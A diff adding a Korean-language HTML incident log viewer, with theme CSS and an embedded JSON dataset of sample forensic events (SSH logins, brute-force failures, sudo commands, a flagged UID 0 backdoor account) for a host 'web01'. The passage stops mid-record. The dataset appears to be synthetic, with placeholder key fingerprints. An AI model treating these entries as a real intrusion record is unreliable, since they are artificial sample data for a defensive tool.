@@ -1,0 +1,764 @@
+<!doctype html>
+<html lang="ko">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>침해사고 로그 뷰어</title>
+<style>
+:root{
+  --bg:#0b0f15;--panel:#121821;--panel2:#18202b;--line:#253041;--line2:#1d2633;
+  --text:#e4eaf2;--muted:#8a97a8;--faint:#5c697b;--accent:#5b9dff;--accent-bg:#1a2b47;
+  --crit:#ff4d5e;--high:#ff9a3d;--med:#e9c04a;--low:#58a6ff;--info:#6b7787;
+  --crit-bg:rgba(255,77,94,.10);--high-bg:rgba(255,154,61,.07);
+  --c-auth:#5b9dff;--c-session:#8f86f0;--c-cmd:#94a3b8;--c-db:#ff5f9e;--c-transfer:#ff9a3d;
+  --c-persist:#c78bff;--c-antiforensic:#ff4d5e;--c-exec:#f97316;--c-privesc:#e9c04a;--c-recon:#34c47c;
+  --mono:ui-monospace,"Cascadia Mono","D2Coding",Consolas,"SFMono-Regular",monospace;
+  --sans:"Pretendard","Apple SD Gothic Neo","Malgun Gothic",system-ui,-apple-system,"Segoe UI",sans-serif;
+  color-scheme:dark;
+}
+:root[data-theme=light]{
+  --bg:#f5f7fa;--panel:#ffffff;--panel2:#f0f3f7;--line:#d9dfe7;--line2:#e7ebf0;
+  --text:#18212d;--muted:#5d6b7c;--faint:#8b97a6;--accent:#2563eb;--accent-bg:#e5eeff;
+  --crit:#d92638;--high:#d9690f;--med:#a77d00;--low:#2563eb;--info:#7a8594;
+  --crit-bg:rgba(217,38,56,.07);--high-bg:rgba(217,105,15,.05);
+  --c-auth:#2563eb;--c-session:#6d5ae6;--c-cmd:#64748b;--c-db:#d6337a;--c-transfer:#d9690f;
+  --c-persist:#9a4ee0;--c-antiforensic:#d92638;--c-exec:#c2410c;--c-privesc:#a77d00;--c-recon:#15803d;
+  color-scheme:light;
+}
+*{box-sizing:border-box}
+html,body{margin:0}
+body{background:var(--bg);color:var(--text);font:14px/1.5 var(--sans);-webkit-font-smoothing:antialiased}
+a{color:var(--accent);cursor:pointer;text-decoration:none}
+a:hover{text-decoration:underline}
+code,.mono{font-family:var(--mono);font-size:12.5px}
+button{font:inherit;color:inherit}
+header{position:sticky;top:0;z-index:20;background:var(--bg);border-bottom:1px solid var(--line)}
+.hwrap{max-width:1560px;margin:0 auto;padding:12px 20px 0;display:flex;flex-wrap:wrap;align-items:center;gap:6px 18px}
+.brand{display:flex;align-items:center;gap:10px;font-weight:700;font-size:16px;letter-spacing:-.01em}
+.brand svg{color:var(--crit)}
+.meta{color:var(--muted);font-size:12.5px;display:flex;gap:14px;flex-wrap:wrap}
+.meta b{color:var(--text);font-weight:600}
+.spacer{flex:1}
+.iconbtn{background:var(--panel);border:1px solid var(--line);border-radius:8px;padding:5px 10px;cursor:pointer;font-size:12.5px;color:var(--muted)}
+.iconbtn:hover{color:var(--text);border-color:var(--faint)}
+nav{max-width:1560px;margin:0 auto;padding:0 20px;display:flex;gap:2px;overflow-x:auto}
+nav button{background:none;border:0;border-bottom:2px solid transparent;padding:10px 14px;cursor:pointer;color:var(--muted);font-weight:600;white-space:nowrap}
+nav button:hover{color:var(--text)}
+nav button.on{color:var(--text);border-bottom-color:var(--accent)}
+nav .n{font-weight:500;color:var(--faint);font-size:12px;margin-left:4px}
+main{max-width:1560px;margin:0 auto;padding:18px 20px 60px}
+h2{font-size:15px;margin:0 0 10px;font-weight:700;letter-spacing:-.01em}
+h2 small{font-weight:500;color:var(--muted);font-size:12.5px;margin-left:6px}
+.panel{background:var(--panel);border:1px solid var(--line);border-radius:12px;padding:16px}
+.grid2{display:grid;grid-template-columns:minmax(0,1.6fr) minmax(0,1fr);gap:16px;align-items:start}
+@media (max-width:1000px){.grid2{grid-template-columns:1fr}}
+.kpis{display:grid;grid-template-columns:repeat(6,minmax(0,1fr));gap:10px;margin-bottom:16px}
+@media (max-width:1100px){.kpis{grid-template-columns:repeat(3,minmax(0,1fr))}}
+@media (max-width:560px){.kpis{grid-template-columns:repeat(2,minmax(0,1fr))}}
+.kpi{background:var(--panel);border:1px solid var(--line);border-radius:12px;padding:12px 14px;cursor:pointer;text-align:left;position:relative;overflow:hidden}
+.kpi:hover{border-color:var(--faint)}
+.kpi::before{content:"";position:absolute;left:0;top:0;bottom:0;width:3px;background:var(--k)}
+.kpi .l{color:var(--muted);font-size:12.5px}
+.kpi .v{font-size:26px;font-weight:700;font-variant-numeric:tabular-nums;letter-spacing:-.02em;line-height:1.25}
+.kpi .s{color:var(--faint);font-size:11.5px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.kpi.zero .v{color:var(--faint)}
+.notes{border:1px solid color-mix(in srgb,var(--high) 45%,transparent);background:var(--high-bg);border-radius:10px;padding:10px 14px;margin-bottom:16px;font-size:13px}
+.notes div::before{content:"⚠ ";color:var(--high)}
+/* 흐름 */
+.flow{list-style:none;margin:0;padding:0;position:relative}
+.flow li{display:grid;grid-template-columns:72px 14px minmax(0,1fr);gap:10px;padding:6px 0;cursor:pointer;border-radius:8px}
+.flow li:hover{background:var(--panel2)}
+.flow .t{font-family:var(--mono);font-size:12px;color:var(--muted);text-align:right;padding-top:2px}
+.flow .t span{display:block;font-size:10.5px;color:var(--faint)}
+.flow .dot{width:10px;height:10px;border-radius:50%;margin-top:6px;background:var(--c);box-shadow:0 0 0 3px color-mix(in srgb,var(--c) 22%,transparent)}
+.flow .b{min-width:0}
+.flow .m{font-weight:600}
+.flow code{display:block;color:var(--muted);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;margin-top:1px}
+.flow .who{color:var(--faint);font-size:12px}
+.daysep{font-size:11.5px;color:var(--faint);padding:8px 0 2px 96px;font-weight:600}
+/* 배지 */
+.sev{display:inline-flex;align-items:center;gap:5px;font-size:12px;font-weight:600;white-space:nowrap;color:var(--s)}
+.sev::before{content:"";width:8px;height:8px;border-radius:2px;background:var(--s)}
+.sev.crit{--s:var(--crit)}.sev.high{--s:var(--high)}.sev.med{--s:var(--med)}.sev.low{--s:var(--low)}.sev.info{--s:var(--info)}
+.cat{display:inline-block;font-size:11.5px;font-weight:600;padding:1px 7px;border-radius:5px;white-space:nowrap;
+  color:var(--c);background:color-mix(in srgb,var(--c) 14%,transparent);border:1px solid color-mix(in srgb,var(--c) 30%,transparent)}
+.tag{display:inline-block;font-size:11px;padding:0 6px;border-radius:4px;background:var(--panel2);color:var(--muted);border:1px solid var(--line);margin:1px 3px 1px 0;white-space:nowrap}
+.tag.hot{color:var(--crit);border-color:color-mix(in srgb,var(--crit) 40%,transparent);background:var(--crit-bg)}
+/* 툴바 */
+.toolbar{display:flex;flex-wrap:wrap;gap:8px;align-items:center;margin-bottom:10px}
+.search{flex:1 1 260px;min-width:0;background:var(--panel);border:1px solid var(--line);border-radius:8px;padding:7px 10px;color:var(--text);font:inherit}
+.search:focus,select:focus{outline:2px solid color-mix(in srgb,var(--accent) 50%,transparent);border-color:var(--accent)}
+select{background:var(--panel);border:1px solid var(--line);border-radius:8px;padding:6px 8px;color:var(--text);font:inherit}
+.chips{display:flex;flex-wrap:wrap;gap:6px;margin-bottom:10px}
+.chip{border:1px solid var(--line);background:var(--panel);border-radius:999px;padding:3px 10px;cursor:pointer;font-size:12.5px;display:inline-flex;align-items:center;gap:6px;color:var(--muted)}
+.chip i{width:8px;height:8px;border-radius:50%;background:var(--c);opacity:.35}
+.chip.on{color:var(--text);border-color:color-mix(in srgb,var(--c) 55%,transparent);background:color-mix(in srgb,var(--c) 10%,var(--panel))}
+.chip.on i{opacity:1}
+.chip .n{color:var(--faint);font-size:11.5px;font-variant-numeric:tabular-nums}
+.pill{display:inline-flex;align-items:center;gap:6px;background:var(--accent-bg);color:var(--text);border-radius:999px;padding:3px 6px 3px 10px;font-size:12.5px}
+.pill button{border:0;background:none;cursor:pointer;color:var(--muted);font-size:14px;line-height:1;padding:0 3px}
+.count{color:var(--muted);font-size:12.5px;margin-left:auto}
+/* 표 */
+.tablewrap{overflow-x:auto;border:1px solid var(--line);border-radius:12px;background:var(--panel)}
+table{border-collapse:collapse;width:100%;min-width:980px}
+th{position:sticky;top:0;background:var(--panel2);text-align:left;font-size:12px;color:var(--muted);font-weight:600;padding:8px 10px;border-bottom:1px solid var(--line);white-space:nowrap}
+td{padding:7px 10px;border-bottom:1px solid var(--line2);vertical-align:top}
+tr.ev{cursor:pointer}
+tr.ev:hover td{background:var(--panel2)}
+tr.ev.crit td{background:var(--crit-bg)}
+tr.ev.crit td:first-child{box-shadow:inset 3px 0 0 var(--crit)}
+tr.ev.high td:first-child{box-shadow:inset 3px 0 0 var(--high)}
+tr.ev.open td{background:var(--panel2)}
+td.t{font-family:var(--mono);font-size:12px;white-space:nowrap;color:var(--muted)}
+td.m{min-width:380px}
+td.m .msg{font-weight:600}
+td.m code{display:block;margin-top:2px;white-space:pre-wrap;word-break:break-all;color:var(--text);opacity:.9}
+td.src{font-family:var(--mono);font-size:11.5px;color:var(--faint);width:150px;max-width:150px;word-break:break-all}
+td.ipc{white-space:nowrap;font-family:var(--mono);font-size:12.5px}
+.inferred{font-style:italic;opacity:.75}
+tr.detail td{background:var(--bg);padding:12px 16px}
+.kv{display:grid;grid-template-columns:110px minmax(0,1fr);gap:4px 12px;font-size:13px}
+.kv dt{color:var(--muted)}
+.kv dd{margin:0;min-width:0}
+pre.raw{margin:0;padding:10px 12px;background:var(--panel2);border:1px solid var(--line);border-radius:8px;font:12px/1.55 var(--mono);white-space:pre-wrap;word-break:break-all;max-height:320px;overflow:auto}
+.more{display:block;margin:12px auto 0;padding:8px 18px}
+.empty{padding:40px;text-align:center;color:var(--muted)}
+/* 공격자 */
+.cards{display:grid;grid-template-columns:repeat(auto-fill,minmax(340px,1fr));gap:12px}
+.card{background:var(--panel);border:1px solid var(--line);border-radius:12px;padding:14px 16px}
+.card.hot{border-color:color-mix(in srgb,var(--crit) 55%,transparent)}
+.card h3{margin:0;font:600 16px var(--mono);display:flex;align-items:center;gap:8px;flex-wrap:wrap}
+.badge{font:600 11px var(--sans);padding:1px 7px;border-radius:5px;background:var(--panel2);color:var(--muted);border:1px solid var(--line)}
+.badge.red{color:var(--crit);border-color:color-mix(in srgb,var(--crit) 45%,transparent);background:var(--crit-bg)}
+.score{height:4px;border-radius:2px;background:var(--line2);margin:10px 0 12px;overflow:hidden}
+.score i{display:block;height:100%;background:linear-gradient(90deg,var(--high),var(--crit))}
+.stats{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;margin-bottom:10px}
+.stats div{background:var(--panel2);border-radius:8px;padding:6px 10px}
+.stats b{display:block;font-size:18px;font-variant-numeric:tabular-nums}
+.stats span{font-size:11.5px;color:var(--muted)}
+.row{font-size:12.5px;color:var(--muted);margin:4px 0}
+.row b{color:var(--text);font-weight:500}
+.acts{display:flex;gap:8px;margin-top:12px}
+/* 세션 */
+.sess{background:var(--panel);border:1px solid var(--line);border-radius:12px;margin-bottom:10px;overflow:hidden}
+.sess.hot{border-color:color-mix(in srgb,var(--crit) 50%,transparent)}
+.sess>summary{list-style:none;cursor:pointer;padding:12px 16px;display:flex;flex-wrap:wrap;gap:6px 14px;align-items:center}
+.sess>summary::-webkit-details-marker{display:none}
+.sess>summary::before{content:"▸";color:var(--faint);transition:transform .15s}
+.sess[open]>summary::before{transform:rotate(90deg)}
+.sess .who{font:600 14px var(--mono)}
+.sess .when{color:var(--muted);font-size:12.5px;font-family:var(--mono)}
+.sess .body{border-top:1px solid var(--line);padding:6px 0}
+.sline{display:grid;grid-template-columns:76px 96px minmax(0,1fr);gap:10px;padding:5px 16px;font-size:13px;cursor:pointer}
+.sline:hover{background:var(--panel2)}
+.sline .t{font:12px var(--mono);color:var(--muted)}
+.sline code{white-space:pre-wrap;word-break:break-all}
+.sline .mm{font-weight:600;margin-right:6px}
+.srcs td{font-size:13px}
+/* 해설 */
+.expl{margin-top:6px;font-size:13px;line-height:1.55}
+.ex-sum{display:flex;gap:6px;align-items:flex-start;background:var(--accent-bg);border-radius:8px;padding:6px 10px;color:var(--text)}
+.ex-ic{flex:none;font-size:12px;line-height:1.7}
+.ex-det{list-style:none;margin:5px 0 0;padding:0 0 0 4px;display:grid;gap:3px}
+.ex-det li{display:flex;gap:8px;align-items:baseline;color:var(--muted);font-size:12.5px}
+.ex-det li code{flex:none;max-width:45%;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;display:inline;margin:0;padding:0 6px;border-radius:4px;background:var(--panel2);border:1px solid var(--line);color:var(--text);font-size:11.5px}
+.ex-note{margin-top:5px;color:var(--muted);font-size:12.5px}
+.ex-chk{margin-top:5px;font-size:12.5px;color:var(--text);border-left:3px solid var(--high);padding:2px 0 2px 8px}
+.ex-chk b{color:var(--high);margin-right:4px}
+.flow .expl{margin-top:4px}
+.flow .ex-sum,.sline .ex-sum{background:none;padding:0;color:var(--muted);font-size:12.5px}
+/* 히스토리 */
+.hgrid{display:grid;grid-template-columns:260px minmax(0,1fr);gap:16px;align-items:start}
+@media (max-width:860px){.hgrid{grid-template-columns:1fr}}
+.hlist{position:sticky;top:110px;max-height:calc(100vh - 130px);overflow:auto}
+@media (max-width:860px){.hlist{position:static;max-height:none}}
+.hfile{display:block;width:100%;text-align:left;background:none;border:1px solid transparent;border-radius:8px;padding:8px 10px;cursor:pointer;margin-bottom:4px}
+.hfile:hover{background:var(--panel2)}
+.hfile.on{background:var(--accent-bg);border-color:color-mix(in srgb,var(--accent) 40%,transparent)}
+.hf-p{font-size:12.5px;word-break:break-all}
+.hf-m{font-size:12px;color:var(--muted);margin-top:2px}
+.hnotes{font-size:12.5px;color:var(--muted);margin:-4px 0 10px;display:grid;gap:3px}
+.hnotes div::before{content:"ⓘ ";color:var(--accent)}
+.hcode{border:1px solid var(--line);border-radius:10px;overflow:hidden;background:var(--bg)}
+.hl{display:grid;grid-template-columns:44px 112px minmax(0,1fr);gap:10px;padding:5px 12px 5px 0;border-bottom:1px solid var(--line2);font-size:13px}
+.hl:last-child{border-bottom:0}
+.hl.click{cursor:pointer}
+.hl.click:hover{background:var(--panel2)}
+.hl.crit{background:var(--crit-bg);box-shadow:inset 3px 0 0 var(--crit)}
+.hl.high{background:var(--high-bg);box-shadow:inset 3px 0 0 var(--high)}
+.hn{text-align:right;color:var(--faint);font:12px var(--mono);user-select:none}
+.ht{color:var(--muted);font:12px var(--mono);white-space:nowrap}
+.hc code{white-space:pre-wrap;word-break:break-all;margin-right:6px}
+.hc .expl{margin-top:3px}
+.hc .ex-sum{background:none;padding:0;color:var(--muted);font-size:12.5px}
+@media (max-width:640px){.hl{grid-template-columns:34px minmax(0,1fr)}.ht{display:none}}
+.tgl{font-size:12.5px;color:var(--muted);display:flex;gap:5px;align-items:center;white-space:nowrap}
+.appendchk{font-size:12.5px;color:var(--text);display:inline-flex;gap:5px;align-items:center;background:var(--panel);border:1px solid var(--line);border-radius:8px;padding:5px 10px}
+/* 가이드 */
+.gsteps{margin:0;padding-left:22px;display:grid;gap:6px;font-size:13.5px}
+.gcards{display:grid;grid-template-columns:repeat(auto-fill,minmax(380px,1fr));gap:12px}
+@media (max-width:640px){.gcards{grid-template-columns:1fr}}
+.g-h{display:flex;gap:8px;align-items:center;flex-wrap:wrap;margin-bottom:8px}
+.badge.ok{color:var(--c-recon);border-color:color-mix(in srgb,var(--c-recon) 45%,transparent)}
+.g-files{margin:0 0 10px;font:12px/1.5 var(--mono);color:var(--muted);white-space:pre-wrap}
+.g-sec{margin-top:10px;font-size:13px}
+.g-t{font-size:12px;font-weight:700;color:var(--muted);margin-bottom:3px}
+.g-sec ul{margin:0;padding-left:18px;display:grid;gap:2px}
+/* 업로드 */
+.dropzone{margin-top:12px;border:2px dashed var(--line);border-radius:12px;padding:34px 16px;text-align:center;color:var(--muted);background:var(--panel2);transition:border-color .15s,background .15s}
+.dropzone svg{color:var(--accent)}
+.dropzone.disabled{opacity:.55}
+.dropzone.disabled svg{color:var(--faint)}
+.dz-t{font-size:16px;font-weight:600;color:var(--text);margin-top:8px}
+.dz-s{font-size:12.5px;margin-top:4px}
+.dropzone .acts{flex-wrap:wrap;margin-top:16px}
+.iconbtn.primary{background:var(--accent);border-color:var(--accent);color:#fff;font-weight:600}
+.iconbtn.primary:hover{color:#fff;filter:brightness(1.1)}
+.iconbtn:disabled{opacity:.5;cursor:not-allowed}
+body.dragging::after{content:"여기에 놓으면 업로드 후 분석합니다";position:fixed;inset:10px;z-index:100;display:flex;align-items:center;justify-content:center;
+  border:3px dashed var(--accent);border-radius:16px;background:color-mix(in srgb,var(--bg) 82%,transparent);color:var(--text);font-size:20px;font-weight:700;pointer-events:none}
+@media (max-width:640px){
+  .hwrap,nav,main{padding-left:16px;padding-right:16px}
+  .flow li{grid-template-columns:58px 12px minmax(0,1fr);gap:8px}
+  .daysep{padding-left:78px}
+  .sline{grid-template-columns:64px minmax(0,1fr)}
+  .sline .c{display:none}
+  .cards{grid-template-columns:1fr}
+}
+</style>
+</head>
+<body>
+<header>
+  <div class="hwrap">
+    <div class="brand">
+      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2l8 4v6c0 5-3.5 8.5-8 10-4.5-1.5-8-5-8-10V6z"/><path d="M12 8v5"/><path d="M12 16h.01"/></svg>
+      침해사고 로그 뷰어
+    </div>
+    <div class="meta" id="meta"></div>
+    <div class="spacer"></div>
+    <button class="iconbtn" id="theme" title="테마 전환">테마</button>
+  </div>
+  <nav id="nav"></nav>
+</header>
+<main id="main"></main>
+
+<script id="secview-data" type="application/json">{"meta":{"generated":"2026-10-04 16:55:24","root":"E:\\PJT\\opus_로그뷰어\\samples","hosts":["web01"],"tz_offset_min":540.0,"tz_label":"UTC+09:00","range":[1790899331.0,1790963522.0],"sources":[{"path":"/var/log/auth.log.1","kind":"SSH/계정","events":8},{"path":"/var/log/auth.log","kind":"SSH/계정","events":96},{"path":"/var/log/audit/audit.log","kind":"auditd","events":37},{"path":"/home/alice/.bash_history","kind":"셸 히스토리","events":4},{"path":"/root/.bash_history","kind":"셸 히스토리","events":22},{"path":"/var/log/btmp","kind":"btmp","events":1},{"path":"/var/log/wtmp","kind":"wtmp","events":6},{"path":"/var/log/mysql/mysql.log","kind":"MySQL","events":4},{"path":"/var/log/postgresql/postgresql-16-main.log","kind":"PostgreSQL","events":2}],"notes":["/etc/passwd 에 UID 0 계정 존재: sysupd (백도어 계정 의심)"],"version":"1.0"},"cats":{"auth":"SSH 인증","session":"세션","cmd":"명령어","db":"DB 접근·덤프","transfer":"파일 전송","persist":"지속성 확보","antiforensic":"흔적 삭제","exec":"악성 실행","privesc":"권한 상승","recon":"정찰"},"events":[{"ts":1790899331.0,"cat":"auth","sev":"med","msg":"SSH 로그인 성공 (publickey)","kind":"login_ok","user":"alice","ip":"10.0.0.15","method":"publickey","detail":"ED25519 SHA256:aLiCeKeY0f1nGeRpRiNt","host":"web01","src":"/var/log/auth.log.1","line":1,"raw":"Oct  2 09:02:11 web01 sshd[1101]: Accepted publickey for alice from 10.0.0.15 port 50122 ssh2: ED25519 SHA256:aLiCeKeY0f1nGeRpRiNt","pid":"1101","tags":["키: ED25519 SHA256:aLiCeKeY0f1nGeRpRiNt"],"sid":"S1","note":"SSH 키로 로그인했습니다. 함께 기록된 키 지문(SHA256:…)으로 어떤 키인지 알 수 있습니다. 모르는 키라면 authorized_keys 에 심어진 백도어입니다."},{"ts":1790899331.0,"cat":"session","sev":"info","msg":"SSH 세션 시작","kind":"sess_open","user":"alice","host":"web01","src":"/var/log/auth.log.1","line":2,"raw":"Oct  2 09:02:11 web01 sshd[1101]: pam_unix(sshd:session): session opened for user alice(uid=1000) by (uid=0)","pid":"1101","sid":"S1","ip":"10.0.0.15"},{"ts":1790899420.0,"cat":"cmd","sev":"info","msg":"명령 실행","cmd":"/usr/bin/systemctl restart nginx","user":"alice","via":"sudo","tags":["sudo"],"cwd":"/home/alice","runas":"root","host":"web01","src":"/var/log/auth.log.1","line":3,"raw":"Oct  2 09:03:40 web01 sudo[1130]:    alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx","pid":"1130","sid":"S1","ip":"10.0.0.15","explain":{"summary":["nginx 서비스를 재시작했습니다."],"details":[],"check":[]}},{"ts":1790900402.0,"cat":"session","sev":"info","msg":"연결 종료","kind":"disconnect","user":"alice","ip":"10.0.0.15","host":"web01","src":"/var/log/auth.log.1","line":4,"raw":"Oct  2 09:20:02 web01 sshd[1101]: Disconnected from user alice 10.0.0.15 port 50122","pid":"1101","sid":"S1"},{"ts":1790900402.0,"cat":"session","sev":"info","msg":"SSH 세션 종료","kind":"sess_close","user":"alice","host":"web01","src":"/var/log/auth.log.1","line":5,"raw":"Oct  2 09:20:02 web01 sshd[1101]: pam_unix(sshd:session): session closed for user alice","pid":"1101","sid":"S1","ip":"10.0.0.15"},{"ts":1790919669.0,"cat":"auth","sev":"info","msg":"존재하지 않는 계정으로 접속 시도","kind":"invalid","user":"oracle","ip":"103.152.18.4","host":"web01","src":"/var/log/auth.log.1","line":6,"raw":"Oct  2 14:41:09 web01 sshd[1422]: Invalid user oracle from 103.152.18.4 port 41022","pid":"1422","note":"서버에 없는 계정 이름으로 접속을 시도했습니다. admin, test, oracle 같은 흔한 이름을 차례로 넣어보는 자동화 공격 도구의 전형적인 흔적입니다."},{"ts":1790919671.0,"cat":"auth","sev":"low","msg":"SSH 로그인 실패 (password) — 존재하지 않는 계정","kind":"login_fail","user":"oracle","ip":"103.152.18.4","host":"web01","src":"/var/log/auth.log.1","line":7,"raw":"Oct  2 14:41:11 web01 sshd[1422]: Failed password for invalid user oracle from 103.152.18.4 port 41022 ssh2","pid":"1422","note":"비밀번호가 틀려 로그인에 실패했습니다. 같은 IP 에서 짧은 시간에 많이 반복되면 무차별 대입 공격입니다."},{"ts":1790919675.0,"cat":"auth","sev":"low","msg":"SSH 로그인 실패 (password)","kind":"login_fail","user":"root","ip":"103.152.18.4","host":"web01","src":"/var/log/auth.log.1","line":8,"raw":"Oct  2 14:41:15 web01 sshd[1424]: Failed password for root from 103.152.18.4 port 41040 ssh2","pid":"1424","note":"비밀번호가 틀려 로그인에 실패했습니다. 같은 IP 에서 짧은 시간에 많이 반복되면 무차별 대입 공격입니다."},{"ts":1790958612.0,"cat":"auth","sev":"med","msg":"SSH 로그인 성공 (publickey)","kind":"login_ok","user":"alice","ip":"10.0.0.15","method":"publickey","detail":"ED25519 SHA256:aLiCeKeY0f1nGeRpRiNt","host":"web01","src":"/var/log/auth.log","line":1,"raw":"Oct  3 01:30:12 web01 sshd[1802]: Accepted publickey for alice from 10.0.0.15 port 50312 ssh2: ED25519 SHA256:aLiCeKeY0f1nGeRpRiNt","pid":"1802","tags":["키: ED25519 SHA256:aLiCeKeY0f1nGeRpRiNt"],"sid":"S2","note":"SSH 키로 로그인했습니다. 함께 기록된 키 지문(SHA256:…)으로 어떤 키인지 알 수 있습니다. 모르는 키라면 authorized_keys 에 심어진 백도어입니다."},{"ts":1790958612.0,"cat":"session","sev":"info","msg":"SSH 세션 시작","kind":"sess_open","user":"alice","host":"web01","src":"/var/log/auth.log","line":2,"raw":"Oct  3 01:30:12 web01 sshd[1802]: pam_unix(sshd:session): session opened for user alice(uid=1000) by (uid=0)","pid":"1802","sid":"S2","ip":"10.0.0.15"},{"ts":1790958612,"cat":"session","sev":"info","msg":"로그인 기록 (wtmp, pts/0)","kind":"wtmp_login","user":"alice","ip":"10.0.0.15","tty":"pts/0","pid":"1802","src":"/var/log/wtmp","line":1,"sid":"S2","note":"wtmp(last 명령이 읽는 파일)에 남은 로그인 기록입니다."},{"ts":1790958613.0,"cat":"session","sev":"info","msg":"audit 로그인 기록","kind":"audit_login","user":"alice","ip":"10.0.0.15","ses":"3","pid":"1802","src":"/var/log/audit/audit.log","line":1,"raw":"type=USER_LOGIN msg=audit(1790958613.000:1201): pid=1802 uid=0 auid=1000 ses=3 subj=unconfined msg='op=login id=1000 exe=\"/usr/sbin/sshd\" hostname=? addr=10.0.0.15 terminal=/dev/pts/1 res=success'","sid":"S2","note":"auditd 가 남긴 로그인 기록입니다. auth.log 가 지워져도 따로 남아 있을 수 있어 교차 확인에 씁니다."},{"ts":1790958665.0,"cat":"cmd","sev":"info","msg":"명령 실행","cmd":"/usr/bin/apt update","user":"alice","via":"sudo","tags":["sudo"],"cwd":"/home/alice","runas":"root","host":"web01","src":"/var/log/auth.log","line":3,"raw":"Oct  3 01:31:05 web01 sudo[1840]:    alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/apt update","pid":"1840","sid":"S2","ip":"10.0.0.15","explain":{"summary":["설치할 수 있는 패키지 목록을 최신으로 갱신했습니다. 일반적인 관리 작업입니다."],"details":[],"check":[]}},{"ts":1790958665.0,"cat":"privesc","sev":"med","msg":"권한 상승","cmd":"sudo apt update","user":"alice","via":"audit","tags":["auditd"],"src":"/var/log/audit/audit.log","line":2,"raw":"type=SYSCALL msg=audit(1790958665.000:1202): arch=c000003e syscall=59 success=yes exit=0 ppid=5651 pid=5652 auid=1000 uid=1000 gid=0 euid=1000 tty=pts1 ses=3 comm=\"sudo\" exe=\"/usr/bin/sudo\" key=(null)\ntype=EXECVE msg=audit(1790958665.000:1202): argc=3 a0=\"sudo\" a1=\"apt\" a2=\"update\"\ntype=CWD msg=audit(1790958665.000:1202): cwd=\"/home/alice\"\ntype=PROCTITLE msg=audit(1790958665.000:1202): proctitle=7375646F0061707400757064617465","ses":"3","pid":"5652","cwd":"/home/alice","exe":"/usr/bin/sudo","sid":"S2","ip":"10.0.0.15","explain":{"summary":["설치할 수 있는 패키지 목록을 최신으로 갱신했습니다. 일반적인 관리 작업입니다."],"details":[["sudo","root(관리자) 권한으로 실행했습니다."]],"check":[]}},{"ts":1790958790.0,"cat":"cmd","sev":"info","msg":"명령 실행","cmd":"df -h","user":"alice","via":"audit","tags":["auditd"],"src":"/var/log/audit/audit.log","line":6,"raw":"type=SYSCALL msg=audit(1790958790.000:1203): arch=c000003e syscall=59 success=yes exit=0 ppid=4234 pid=4235 auid=1000 uid=1000 gid=0 euid=1000 tty=pts1 ses=3 comm=\"df\" exe=\"/usr/bin/df\" key=(null)\ntype=EXECVE msg=audit(1790958790.000:1203): argc=2 a0=\"df\" a1=\"-h\"\ntype=CWD msg=audit(1790958790.000:1203): cwd=\"/home/alice\"\ntype=PROCTITLE msg=audit(1790958790.000:1203): proctitle=6466002D68","ses":"3","pid":"4235","cwd":"/home/alice","exe":"/usr/bin/df","sid":"S2","ip":"10.0.0.15","explain":{"summary":["디스크 남은 용량을 확인하는 명령입니다."],"details":[],"check":[]}},{"ts":1790958842.0,"cat":"cmd","sev":"info","msg":"명령 실행","cmd":"ls -la /var/www","user":"alice","via":"audit","tags":["auditd"],"src":"/var/log/audit/audit.log","line":10,"raw":"type=SYSCALL msg=audit(1790958842.000:1204): arch=c000003e syscall=59 success=yes exit=0 ppid=6233 pid=6234 auid=1000 uid=1000 gid=0 euid=1000 tty=pts1 ses=3 comm=\"ls\" exe=\"/usr/bin/ls\" key=(null)\ntype=EXECVE msg=audit(1790958842.000:1204): argc=3 a0=\"ls\" a1=\"-la\" a2=\"/var/www\"\ntype=CWD msg=audit(1790958842.000:1204): cwd=\"/home/alice\"\ntype=PROCTITLE msg=audit(1790958842.000:1204): proctitle=6C73002D6C61002F7661722F777777","ses":"3","pid":"6234","cwd":"/home/alice","exe":"/usr/bin/ls","sid":"S2","ip":"10.0.0.15","explain":{"summary":["/var/www 폴더 안의 파일 목록을 봤습니다. 숨김 파일까지 자세히 봤습니다."],"details":[],"check":[]}},{"ts":1790959530.0,"cat":"session","sev":"info","msg":"연결 종료","kind":"disconnect","ip":"10.0.0.15","host":"web01","src":"/var/log/auth.log","line":5,"raw":"Oct  3 01:45:30 web01 sshd[1802]: Received disconnect from 10.0.0.15 port 50312:11: disconnected by user","pid":"1802","sid":"S2"},{"ts":1790959530.0,"cat":"session","sev":"info","msg":"연결 종료","kind":"disconnect","user":"alice","ip":"10.0.0.15","host":"web01","src":"/var/log/auth.log","line":6,"raw":"Oct  3 01:45:30 web01 sshd[1802]: Disconnected from user alice 10.0.0.15 port 50312","pid":"1802","sid":"S2"},{"ts":1790959530.0,"cat":"session","sev":"info","msg":"SSH 세션 종료","kind":"sess_close","user":"alice","host":"web01","src":"/var/log/auth.log","line":7,"raw":"Oct  3 01:45:30 web01 sshd[1802]: pam_unix(sshd:session): session closed for user alice","pid":"1802","sid":"S2","ip":"10.0.0.15"},{"ts":1790961003.0,"cat":"auth","sev":"info","msg":"존재하지 않는 계정으로 접속 시도","kind":"invalid","user":"admin","ip":"45.133.1.77","host":"web01","src":"/var/log/auth.log","line":9,"raw":"Oct  3 02:10:03 web01 sshd[2100]: Invalid user admin from 45.133.1.77 port 50000","pid":"2100","note":"서버에 없는 계정 이름으로 접속을 시도했습니다. admin, test, oracle 같은 흔한 이름을 차례로 넣어보는 자동화 공격 도구의 전형적인 흔적입니다."},{"ts":1790961003.0,"cat":"auth","sev":"low","msg":"SSH 로그인 실패 (password) — 존재하지 않는 계정","kind":"login_fail","user":"admin","ip":"45.133.1.77","host":"web01","src":"/var/log/auth.log","line":10,"raw":"Oct  3 02:10:03 web01 sshd[2100]: Failed password for invalid user admin from 45.133.1.77 port 50000 ssh2","pid":"2100","note":"비밀번호가 틀려 로그인에 실패했습니다. 같은 IP 에서 짧은 시간에 많이 반복되면 무차별 대입 공격입니다."},{"ts":1790961003,"cat":"auth","sev":"low","msg":"로그인 실패 36회 (btmp, 계정 8개)","kind":"btmp","ip":"45.133.1.77","count":36,"cmd":"root(12), admin(6), test(3), 